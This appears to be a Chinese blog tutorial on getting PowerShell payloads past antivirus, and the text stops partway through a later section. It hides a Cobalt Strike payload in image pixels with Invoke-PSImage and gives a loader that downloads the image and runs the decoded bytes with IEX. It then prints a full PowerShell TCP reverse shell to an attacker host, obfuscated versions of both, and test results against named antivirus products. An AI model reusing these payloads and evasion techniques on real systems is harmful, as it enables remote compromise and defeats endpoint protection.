<p>以 PNG 文件的像素对 PowerShell 脚本进行编码，并生成要执行的单行线<br>Invoke-PSImage 采用 PowerShell 脚本，并将脚本的字节编码为 PNG 图像的像素。它生成一个单行线，用于从 Web 的文件执行。<br>它可以仅使用有效负载数据创建新图像，也可以将有效负载嵌入到现有图像的最低有效字节中，使其看起来像实际图片。图像保存为 PNG，并且可以无损压缩，而不会影响执行有效负载的能力，因为数据存储在颜色本身中。创建新映像时，普通的 PowerShell 脚本实际上会显著压缩，通常会生成文件大小约为原始脚本的 50% 的 png。<br>使用嵌入方法时，每个像素中 2 个颜色值中最低有效 4 位用于保存有效负载。图像质量将因此受到影响，但它看起来仍然不错。它可以接受大多数图像类型作为输入，但输出将始终为PNG，因为它需要是无损的。图像的每个像素用于容纳一个字节的脚本，因此您需要一个像素至少与脚本中的字节数一样多的图像。这相当容易 - 例如，Invoke-Mimikatz适合1920x1200的图像。</p>
</blockquote>
<p>先找一张高像素的123.jpg图片 方便后续写入shellcode</p>
<p><img src="/posts/adb63639/1.png" alt="截图"></p>
<br>

<p>在CS中生成一个powershell的payload </p>
<p>在cmd下执行以下命令即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Powershell -ExecutionPolicy Bypass</span><br><span class="line">Import-Module .\Invoke-PSImage.ps1</span><br><span class="line">Invoke-PSImage -Script .\payload.ps1 -Image .\123.jpg -Out 456.jpg -Web</span><br></pre></td></tr></table></figure>

<p><img src="/posts/adb63639/2.png" alt="截图"></p>
<p>在import-module时 要关闭杀软 不然会出现拒绝</p>
<p><img src="/posts/adb63639/3.png" alt="截图"></p>
<p>然后会在当前目录下生成 456.jpg</p>
<p><img src="/posts/adb63639/4.png" alt="截图"></p>
<p>然后再powershell中会生成一段ps1代码 复制报存到shell.ps1</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sal</span> a <span class="built_in">New-Object</span>;<span class="built_in">Add-Type</span> <span class="literal">-A</span> System.Drawing;<span class="variable">$g</span>=a System.Drawing.Bitmap((a Net.WebClient).OpenRead(<span class="string">&quot;http://example.com/456.jpg&quot;</span>));<span class="variable">$o</span>=a Byte[] <span class="number">5120</span>;(<span class="number">0</span>..<span class="number">1</span>)|%&#123;<span class="keyword">foreach</span>(<span class="variable">$x</span> <span class="keyword">in</span>(<span class="number">0</span>..<span class="number">2559</span>))&#123;<span class="variable">$p</span>=<span class="variable">$g</span>.GetPixel(<span class="variable">$x</span>,<span class="variable">$_</span>);<span class="variable">$o</span>[<span class="variable">$_</span>*<span class="number">2560</span>+<span class="variable">$x</span>]=([<span class="type">math</span>]::Floor((<span class="variable">$p</span>.B<span class="literal">-band15</span>)*<span class="number">16</span>)<span class="operator">-bor</span>(<span class="variable">$p</span>.G <span class="operator">-band</span> <span class="number">15</span>))&#125;&#125;;<span class="built_in">IEX</span>([<span class="type">System.Text.Encoding</span>]::ASCII.GetString(<span class="variable">$o</span>[<span class="number">0</span><span class="type">..3534</span>]))</span><br><span class="line"><span class="built_in">PS</span> C:\Users\guoyo\Desktop\powershell_bypass学习\<span class="built_in">Invoke-PSImage</span><span class="literal">-master</span>&gt;</span><br></pre></td></tr></table></figure>

<br>

<p>打开CS 使用文件下载模块去下载生成的456.jpg 点击”Launch”会生成一个url</p>
<p><img src="/posts/adb63639/5.png" alt="截图"></p>
<p><img src="/posts/adb63639/6.png" alt="截图"></p>
<p><code>http://10.10.10.114:80/456.jpg</code></p>
<p>然后将<code>shell.ps1</code>url修改为CS生成的链接</p>
<p><img src="/posts/adb63639/7.png" alt="截图"></p>
<p>改为ps1文件 shell.ps1</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sal</span> a <span class="built_in">New-Object</span>;<span class="built_in">Add-Type</span> <span class="literal">-A</span> System.Drawing;<span class="variable">$g</span>=a System.Drawing.Bitmap((a Net.WebClient).OpenRead(<span class="string">&quot;http://10.10.10.114:80/456.jpg&quot;</span>));<span class="variable">$o</span>=a Byte[] <span class="number">5120</span>;(<span class="number">0</span>..<span class="number">1</span>)|%&#123;<span class="keyword">foreach</span>(<span class="variable">$x</span> <span class="keyword">in</span>(<span class="number">0</span>..<span class="number">2559</span>))&#123;<span class="variable">$p</span>=<span class="variable">$g</span>.GetPixel(<span class="variable">$x</span>,<span class="variable">$_</span>);<span class="variable">$o</span>[<span class="variable">$_</span>*<span class="number">2560</span>+<span class="variable">$x</span>]=([<span class="type">math</span>]::Floor((<span class="variable">$p</span>.B<span class="literal">-band15</span>)*<span class="number">16</span>)<span class="operator">-bor</span>(<span class="variable">$p</span>.G <span class="operator">-band</span> <span class="number">15</span>))&#125;&#125;;<span class="built_in">IEX</span>([<span class="type">System.Text.Encoding</span>]::ASCII.GetString(<span class="variable">$o</span>[<span class="number">0</span><span class="type">..3534</span>]))</span><br></pre></td></tr></table></figure>

<p>在本地火绒机器上运行便可成功上线…但是静态查杀shell.ps1会被杀掉，所以可以先进行powershell混淆</p>
<p><img src="/posts/adb63639/8.png" alt="截图"></p>
<p><img src="/posts/adb63639/9.png" alt="截图"></p>
<p>腾讯电脑管家查不出，也可以直接上线</p>
<h3 id="Invoke-Obfuscation混淆"><a href="#Invoke-Obfuscation混淆" class="headerlink" title="Invoke Obfuscation混淆"></a>Invoke Obfuscation混淆</h3><p>powershell的免杀⽅法有很多，对代码进⾏编码是最常⻅的⼀种，这⾥介绍⼀个专⻔⽤来对powershell<br>进⾏编码免杀的框架Invoke Obfuscation，这也是著名的APT32组织海莲花常⽤的⼀个⼯具。<br>该工具可以对powershell代码进行 ASCII/hex/octal/binary甚至SecureString进行加密混淆</p>
<p>使用Invoke Obfuscation对powerhsell进行混淆 将shell.ps1放到该目录下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Powershell -ExecutionPolicy Bypass</span><br><span class="line">Import-Moudle .\Invoke-Obfuscation.psd1</span><br><span class="line">Invoke-Obfuscation</span><br></pre></td></tr></table></figure>

<p>shell2.ps1</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$</span>&#123;<span class="number">3</span>`7j&#125;=  [<span class="type">typE</span>](<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span> <span class="operator">-F</span><span class="string">&#x27;mat&#x27;</span>,<span class="string">&#x27;H&#x27;</span>)  ; <span class="variable">$</span>&#123;K8`ZR2J&#125; = [<span class="type">tYPE</span>](<span class="string">&quot;&#123;0&#125;&#123;2&#125;&#123;6&#125;&#123;4&#125;&#123;3&#125;&#123;5&#125;&#123;1&#125;&quot;</span> <span class="operator">-F</span> <span class="string">&#x27;Syste&#x27;</span>,<span class="string">&#x27;nG&#x27;</span>,<span class="string">&#x27;m.&#x27;</span>,<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;t.e&#x27;</span>,<span class="string">&#x27;coDI&#x27;</span>,<span class="string">&#x27;TEX&#x27;</span>); &amp;(<span class="string">&quot;&#123;1&#125;&#123;0&#125;&quot;</span> <span class="operator">-f</span><span class="string">&#x27;al&#x27;</span>,<span class="string">&#x27;s&#x27;</span>) (<span class="string">&#x27;a&#x27;</span>) (<span class="string">&quot;&#123;0&#125;&#123;1&#125;&#123;2&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;New-O&#x27;</span>,<span class="string">&#x27;bj&#x27;</span>,<span class="string">&#x27;ect&#x27;</span>);.(<span class="string">&quot;&#123;1&#125;&#123;2&#125;&#123;0&#125;&quot;</span> <span class="operator">-f</span> <span class="string">&#x27;pe&#x27;</span>,<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;dd-Ty&#x27;</span>) <span class="literal">-A</span> (<span class="string">&quot;&#123;0&#125;&#123;3&#125;&#123;2&#125;&#123;1&#125;&quot;</span> <span class="operator">-f</span> <span class="string">&#x27;S&#x27;</span>,<span class="string">&#x27;Drawing&#x27;</span>,<span class="string">&#x27;em.&#x27;</span>,<span class="string">&#x27;yst&#x27;</span>);<span class="variable">$</span>&#123;g&#125;=&amp;(<span class="string">&#x27;a&#x27;</span>) (<span class="string">&quot;&#123;1&#125;&#123;3&#125;&#123;0&#125;&#123;2&#125;&#123;4&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;aw&#x27;</span>,<span class="string">&#x27;Syst&#x27;</span>,<span class="string">&#x27;ing.Bitma&#x27;</span>,<span class="string">&#x27;em.Dr&#x27;</span>,<span class="string">&#x27;p&#x27;</span>)((&amp;(<span class="string">&#x27;a&#x27;</span>) (<span class="string">&quot;&#123;3&#125;&#123;2&#125;&#123;1&#125;&#123;0&#125;&quot;</span> <span class="operator">-f</span> <span class="string">&#x27;nt&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;WebCli&#x27;</span>,<span class="string">&#x27;Net.&#x27;</span>)).(<span class="string">&quot;&#123;2&#125;&#123;0&#125;&#123;1&#125;&quot;</span><span class="operator">-f</span> <span class="string">&#x27;penRea&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;O&#x27;</span>).Invoke((<span class="string">&quot;&#123;1&#125;&#123;7&#125;&#123;5&#125;&#123;3&#125;&#123;8&#125;&#123;4&#125;&#123;0&#125;&#123;2&#125;&#123;6&#125;&quot;</span> <span class="operator">-f</span><span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;http://1&#x27;</span>,<span class="string">&#x27;j&#x27;</span>,<span class="string">&#x27;4:80&#x27;</span>,<span class="string">&#x27;56&#x27;</span>,<span class="string">&#x27;.10.10.11&#x27;</span>,<span class="string">&#x27;pg&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;/4&#x27;</span>)));<span class="variable">$</span>&#123;O&#125;=.(<span class="string">&#x27;a&#x27;</span>) (<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span> <span class="operator">-f</span><span class="string">&#x27;By&#x27;</span>,<span class="string">&#x27;te[]&#x27;</span>) <span class="number">5120</span>;(<span class="number">0</span>..<span class="number">1</span>)|.(<span class="string">&#x27;%&#x27;</span>)&#123;<span class="keyword">foreach</span>(<span class="variable">$</span>&#123;x&#125; <span class="keyword">in</span>(<span class="number">0</span>..<span class="number">2559</span>))&#123;<span class="variable">$</span>&#123;p&#125;=<span class="variable">$</span>&#123;g&#125;.(<span class="string">&quot;&#123;0&#125;&#123;2&#125;&#123;1&#125;&quot;</span> <span class="operator">-f</span> <span class="string">&#x27;Ge&#x27;</span>,<span class="string">&#x27;Pixel&#x27;</span>,<span class="string">&#x27;t&#x27;</span>).Invoke(<span class="variable">$</span>&#123;x&#125;,<span class="variable">$</span>&#123;_&#125;);<span class="variable">$</span>&#123;o&#125;[<span class="variable">$</span>&#123;<span class="type">_</span>&#125;*<span class="number">2560</span>+<span class="variable">$</span>&#123;<span class="type">x</span>&#125;]=( (ChIlDiTeM  (<span class="string">&quot;&#123;0&#125;&#123;2&#125;&#123;3&#125;&#123;1&#125;&quot;</span><span class="operator">-f</span> <span class="string">&#x27;VaRia&#x27;</span>,<span class="string">&#x27;e:37J&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;L&#x27;</span>) ).<span class="string">&quot;vaL`Ue&quot;</span>::(<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span><span class="operator">-f</span> <span class="string">&#x27;Fl&#x27;</span>,<span class="string">&#x27;oor&#x27;</span>).Invoke((<span class="variable">$</span>&#123;P&#125;.<span class="string">&quot;B&quot;</span><span class="literal">-band15</span>)*<span class="number">16</span>)<span class="operator">-bor</span>(<span class="variable">$</span>&#123;P&#125;.<span class="string">&quot;g&quot;</span> <span class="operator">-band</span> <span class="number">15</span>))&#125;&#125;;.(<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;I&#x27;</span>,<span class="string">&#x27;EX&#x27;</span>)(  ( <span class="built_in">gci</span>  (<span class="string">&#x27;V&#x27;</span>+<span class="string">&#x27;ar&#x27;</span>+<span class="string">&#x27;Iab&#x27;</span>+<span class="string">&#x27;LE:k8ZR&#x27;</span>+<span class="string">&#x27;2J&#x27;</span>) ).<span class="string">&quot;VA`LUe&quot;</span>::<span class="string">&quot;ASC`iI&quot;</span>.<span class="string">&quot;GEt`s`TRi`Ng&quot;</span>(<span class="variable">$</span>&#123;o&#125;[<span class="number">0</span><span class="type">..3534</span>]))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p> 静态查杀效果</p>
<p>混淆前</p>
<p><img src="/posts/adb63639/10.png" alt="截图"></p>
<p>混淆后</p>
<p><img src="/posts/adb63639/11.png" alt="截图"></p>
<p><img src="/posts/adb63639/12.png" alt="截图"></p>
<p><img src="/posts/adb63639/13.png" alt="截图"></p>
<p>也可以过360的静态查杀(但是现在360禁止调用powershell 所以…)</p>
<p>上传到VT上查看混淆后的效果</p>
<p><a href="https://www.virustotal.com/gui/file/03e35a1c21bd99766c6f7729c59df32340b2f88ecf834236c143584fc2390d9e?nocache=1">https://www.virustotal.com/gui/file/03e35a1c21bd99766c6f7729c59df32340b2f88ecf834236c143584fc2390d9e?nocache=1</a></p>
<p><img src="/posts/adb63639/14.png" alt="截图"></p>
<p>动态查杀效果</p>
<p><img src="/posts/adb63639/15.png" alt="截图"></p>
<p>火绒 腾讯管家都可以正常上线 不过360禁止调用powershell 没发成功利用… </p>
<h3 id="Powershell-socket免杀"><a href="#Powershell-socket免杀" class="headerlink" title="Powershell socket免杀"></a>Powershell socket免杀</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Set-Variable</span> <span class="literal">-Name</span> client <span class="literal">-Value</span> (<span class="built_in">New-Object</span> System.Net.Sockets.TCPClient(<span class="string">&quot;10.10.10.114&quot;</span>, <span class="number">53</span>));</span><br><span class="line"></span><br><span class="line"><span class="built_in">Set-Variable</span> <span class="literal">-Name</span> stream <span class="literal">-Value</span>(<span class="variable">$client</span>.GetStream());</span><br><span class="line"></span><br><span class="line">[<span class="built_in">byte</span>[]]<span class="variable">$bytes</span> = <span class="number">0</span>..<span class="number">65535</span> | % &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> ((<span class="built_in">Set-Variable</span> <span class="literal">-Name</span> i <span class="literal">-Value</span>(<span class="variable">$stream</span>.Read(<span class="variable">$bytes</span>, <span class="number">0</span>, <span class="variable">$bytes</span>.Length))) <span class="operator">-ne</span> <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">Set-Variable</span> <span class="literal">-Name</span> <span class="keyword">data</span> <span class="literal">-Value</span> ((<span class="built_in">New-Object</span> <span class="literal">-TypeNameSystem</span>.Text.ASCIIEncoding).GetString(<span class="variable">$bytes</span>, <span class="number">0</span>, <span class="variable">$i</span>));</span><br><span class="line">  <span class="built_in">Set-Variable</span> <span class="literal">-Name</span> sendback <span class="literal">-Value</span> (<span class="built_in">iex</span> <span class="variable">$data</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span> | <span class="built_in">Out-String</span> );</span><br><span class="line">  <span class="built_in">Set-Variable</span> <span class="literal">-Name</span> sendback2 <span class="literal">-Value</span> (<span class="variable">$sendback</span> + <span class="string">&quot;PS &quot;</span> + (<span class="built_in">pwd</span>).Path + <span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  <span class="built_in">Set-Variable</span> <span class="literal">-Name</span> sendbyte <span class="literal">-Value</span> (([<span class="type">text.encoding</span>]::ASCII).GetBytes(<span class="variable">$sendback2</span>));</span><br><span class="line">  <span class="variable">$stream</span>.Write(<span class="variable">$sendbyte</span>, <span class="number">0</span>,<span class="variable">$sendbyte</span>.Length);</span><br><span class="line">  <span class="variable">$stream</span>.Flush()</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$client</span>.Close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>使用Invoke Obfuscation 混淆后</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Set-Variable</span> <span class="literal">-Name</span> client <span class="literal">-Value</span> (<span class="built_in">New-Object</span> System.Net.Sockets.TCPClient(<span class="string">&quot;10.10.10.114&quot;</span>, <span class="number">53</span>));</span><br><span class="line">&amp;(<span class="string">&#x27;sV&#x27;</span>) (<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span> <span class="operator">-f</span> <span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;w4c&#x27;</span>) ( [<span class="type">tYPE</span>](<span class="string">&quot;&#123;1&#125;&#123;3&#125;&#123;2&#125;&#123;0&#125;&quot;</span><span class="operator">-f</span> <span class="string">&#x27;nG&#x27;</span>,<span class="string">&#x27;TE&#x27;</span>,(<span class="string">&quot;&#123;1&#125;&#123;2&#125;&#123;0&#125;&quot;</span> <span class="operator">-f</span><span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;En&#x27;</span>,<span class="string">&#x27;cOd&#x27;</span>),<span class="string">&#x27;Xt.&#x27;</span>) ) ;&amp;(<span class="string">&quot;&#123;0&#125;&#123;2&#125;&#123;1&#125;&#123;3&#125;&quot;</span><span class="operator">-f</span>(<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span> <span class="operator">-f</span><span class="string">&#x27;Set&#x27;</span>,<span class="string">&#x27;-&#x27;</span>),<span class="string">&#x27;b&#x27;</span>,(<span class="string">&quot;&#123;1&#125;&#123;0&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;aria&#x27;</span>,<span class="string">&#x27;V&#x27;</span>),<span class="string">&#x27;le&#x27;</span>) <span class="literal">-Value</span> (<span class="variable">$</span>&#123;C`L`IEnT&#125;.(<span class="string">&quot;&#123;1&#125;&#123;2&#125;&#123;0&#125;&quot;</span> <span class="operator">-f</span> <span class="string">&#x27;am&#x27;</span>,(<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span> <span class="operator">-f</span><span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;etS&#x27;</span>),<span class="string">&#x27;tre&#x27;</span>).<span class="string">&quot;i`N`VoKe&quot;</span>()) <span class="literal">-Name</span> (<span class="string">&quot;&#123;0&#125;&#123;1&#125;&#123;2&#125;&quot;</span> <span class="operator">-f</span> <span class="string">&#x27;s&#x27;</span>,(<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;tr&#x27;</span>,<span class="string">&#x27;ea&#x27;</span>),<span class="string">&#x27;m&#x27;</span>);[<span class="built_in">byte</span>[]]<span class="variable">$</span>&#123;b`Yt`es&#125; =<span class="number">0</span>..<span class="number">65535</span>|&amp;(<span class="string">&#x27;%&#x27;</span>)&#123;<span class="number">0</span>&#125;;<span class="keyword">while</span>((.(<span class="string">&quot;&#123;0&#125;&#123;2&#125;&#123;3&#125;&#123;1&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;S&#x27;</span>,(<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span> <span class="operator">-f</span><span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;able&#x27;</span>),<span class="string">&#x27;et&#x27;</span>,(<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span> <span class="operator">-f</span> <span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;Var&#x27;</span>)) <span class="literal">-Name</span> (<span class="string">&#x27;i&#x27;</span>) <span class="literal">-Value</span>(<span class="variable">$</span>&#123;s`T`Ream&#125;.(<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;Rea&#x27;</span>,<span class="string">&#x27;d&#x27;</span>).<span class="string">&quot;IN`Voke&quot;</span>(<span class="variable">$</span>&#123;b`Y`TES&#125;, <span class="number">0</span>,<span class="variable">$</span>&#123;By`Tes&#125;.<span class="string">&quot;LeNg`TH&quot;</span>))) <span class="operator">-ne</span> <span class="number">0</span>)&#123;;&amp;(<span class="string">&quot;&#123;2&#125;&#123;0&#125;&#123;1&#125;&quot;</span> <span class="operator">-f</span><span class="string">&#x27;Va&#x27;</span>,(<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span><span class="operator">-f</span> <span class="string">&#x27;ria&#x27;</span>,<span class="string">&#x27;ble&#x27;</span>),(<span class="string">&quot;&#123;1&#125;&#123;0&#125;&quot;</span><span class="operator">-f</span> <span class="string">&#x27;t-&#x27;</span>,<span class="string">&#x27;Se&#x27;</span>)) <span class="literal">-Name</span> (<span class="string">&quot;&#123;1&#125;&#123;0&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;ta&#x27;</span>,<span class="string">&#x27;da&#x27;</span>) <span class="literal">-Value</span> ((&amp;(<span class="string">&quot;&#123;2&#125;&#123;1&#125;&#123;0&#125;&quot;</span> <span class="operator">-f</span> <span class="string">&#x27;ect&#x27;</span>,(<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;w-&#x27;</span>,<span class="string">&#x27;Obj&#x27;</span>),<span class="string">&#x27;Ne&#x27;</span>) <span class="literal">-TypeName</span> (<span class="string">&quot;&#123;4&#125;&#123;2&#125;&#123;1&#125;&#123;0&#125;&#123;5&#125;&#123;3&#125;&quot;</span> <span class="operator">-f</span><span class="string">&#x27;IEn&#x27;</span>,<span class="string">&#x27;I&#x27;</span>,(<span class="string">&quot;&#123;1&#125;&#123;0&#125;&#123;2&#125;&quot;</span> <span class="operator">-f</span><span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;xt&#x27;</span>,<span class="string">&#x27;ASC&#x27;</span>),(<span class="string">&quot;&#123;1&#125;&#123;0&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;ding&#x27;</span>,<span class="string">&#x27;o&#x27;</span>),(<span class="string">&quot;&#123;1&#125;&#123;2&#125;&#123;0&#125;&quot;</span> <span class="operator">-f</span><span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;Sys&#x27;</span>,<span class="string">&#x27;tem.T&#x27;</span>),<span class="string">&#x27;c&#x27;</span>)).<span class="string">&quot;g`e`TSTRiNg&quot;</span>(<span class="variable">$</span>&#123;bYT`Es&#125;,<span class="number">0</span>, <span class="variable">$</span>&#123;I&#125;));.(<span class="string">&quot;&#123;1&#125;&#123;2&#125;&#123;0&#125;&#123;3&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;Se&#x27;</span>,(<span class="string">&quot;&#123;1&#125;&#123;0&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;t-Va&#x27;</span>),(<span class="string">&quot;&#123;1&#125;&#123;0&#125;&quot;</span><span class="operator">-f</span> <span class="string">&#x27;ble&#x27;</span>,<span class="string">&#x27;a&#x27;</span>)) <span class="literal">-Value</span> (.(<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;ie&#x27;</span>,<span class="string">&#x27;x&#x27;</span>) <span class="variable">$</span>&#123;D`ATA&#125; <span class="number">2</span>&gt;&amp;<span class="number">1</span> | .(<span class="string">&quot;&#123;1&#125;&#123;2&#125;&#123;0&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;Ou&#x27;</span>,(<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;t-Stri&#x27;</span>,<span class="string">&#x27;n&#x27;</span>)) ) <span class="literal">-Name</span>(<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span> <span class="operator">-f</span> (<span class="string">&quot;&#123;1&#125;&#123;2&#125;&#123;0&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;se&#x27;</span>,<span class="string">&#x27;ndba&#x27;</span>),<span class="string">&#x27;k&#x27;</span>);.(<span class="string">&quot;&#123;0&#125;&#123;3&#125;&#123;1&#125;&#123;2&#125;&quot;</span> <span class="operator">-f</span><span class="string">&#x27;Se&#x27;</span>,(<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span><span class="operator">-f</span> <span class="string">&#x27;Va&#x27;</span>,<span class="string">&#x27;riabl&#x27;</span>),<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;t-&#x27;</span>) <span class="literal">-Value</span> (<span class="variable">$</span>&#123;sE`NDBack&#125; + <span class="string">&quot;PS &quot;</span> + (.(<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span> <span class="operator">-f</span><span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;wd&#x27;</span>)).<span class="string">&quot;P`ATH&quot;</span> + <span class="string">&quot;&gt; &quot;</span>) <span class="literal">-Name</span> (<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;se&#x27;</span>,(<span class="string">&quot;&#123;0&#125;&#123;2&#125;&#123;1&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;ack2&#x27;</span>,<span class="string">&#x27;db&#x27;</span>));&amp;(<span class="string">&quot;&#123;1&#125;&#123;2&#125;&#123;3&#125;&#123;0&#125;&quot;</span><span class="operator">-f</span> <span class="string">&#x27;le&#x27;</span>,(<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span><span class="operator">-f</span> <span class="string">&#x27;Set-&#x27;</span>,<span class="string">&#x27;Va&#x27;</span>),<span class="string">&#x27;ri&#x27;</span>,<span class="string">&#x27;ab&#x27;</span>) <span class="literal">-Name</span>(<span class="string">&quot;&#123;1&#125;&#123;0&#125;&quot;</span><span class="operator">-f</span> (<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;ndbyt&#x27;</span>,<span class="string">&#x27;e&#x27;</span>),<span class="string">&#x27;se&#x27;</span>) <span class="literal">-Value</span> (( ( .(<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span> <span class="operator">-f</span><span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;tEm&#x27;</span>) (<span class="string">&quot;&#123;4&#125;&#123;2&#125;&#123;1&#125;&#123;0&#125;&#123;3&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;W4&#x27;</span>,<span class="string">&#x27;Ble:p&#x27;</span>,<span class="string">&#x27;IA&#x27;</span>,<span class="string">&#x27;C&#x27;</span>,<span class="string">&#x27;vaR&#x27;</span>)).<span class="string">&quot;vAL`UE&quot;</span>::<span class="string">&quot;Asc`II&quot;</span>).(<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span> <span class="operator">-f</span>(<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span><span class="operator">-f</span> <span class="string">&#x27;Get&#x27;</span>,<span class="string">&#x27;By&#x27;</span>),<span class="string">&#x27;tes&#x27;</span>).<span class="string">&quot;in`VOKE&quot;</span>(<span class="variable">$</span>&#123;SEN`D`BAck2&#125;));<span class="variable">$</span>&#123;str`eam&#125;.(<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span> <span class="operator">-f</span><span class="string">&#x27;Wri&#x27;</span>,<span class="string">&#x27;te&#x27;</span>).<span class="string">&quot;InV`OKE&quot;</span>(<span class="variable">$</span>&#123;S`en`D`BYTE&#125;,<span class="number">0</span>,<span class="variable">$</span>&#123;SeN`D`ByTe&#125;.<span class="string">&quot;lE`NGtH&quot;</span>);<span class="variable">$</span>&#123;ST`R`EaM&#125;.(<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span> <span class="operator">-f</span> (<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;F&#x27;</span>,<span class="string">&#x27;lus&#x27;</span>),<span class="string">&#x27;h&#x27;</span>).<span class="string">&quot;IN`V`oKe&quot;</span>()&#125;;<span class="variable">$</span>&#123;cl`I`eNT&#125;.(<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span> <span class="operator">-f</span><span class="string">&#x27;C&#x27;</span>,(<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;los&#x27;</span>,<span class="string">&#x27;e&#x27;</span>)).<span class="string">&quot;I`N`Voke&quot;</span>()</span><br></pre></td></tr></table></figure>

<p>在目标机器上运行 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Powershell -ExecutionPolicy Bypass</span><br><span class="line">.\11.ps1</span><br></pre></td></tr></table></figure>

<p>在kali上进行监听 <code>nc -lvvp 53</code></p>
<p><img src="/posts/adb63639/16.png" alt="截图"></p>
<p>火绒不拦截</p>
<p>在win7虚拟机下 360不拦截</p>
<p><img src="/posts/adb63639/17.png" alt="截图"></p>
<p>但是现在360已经拦截了powershell 只要开启360(在win7下会拦截，但是在win10测试时没拦截) 就无法去调用powershell</p>
<br>

<h3 id="PS1源文件命令混淆-行为免杀"><a href="#PS1源文件命令混淆-行为免杀" class="headerlink" title="PS1源文件命令混淆(行为免杀)"></a>PS1源文件命令混淆(行为免杀)</h3><p>尽管powershell代码自身免杀，但是在通过powershell远程下载或者执行shellcode时，很容易被杀软发现拦截</p>
<p>常用的powershell去执行命令</p>
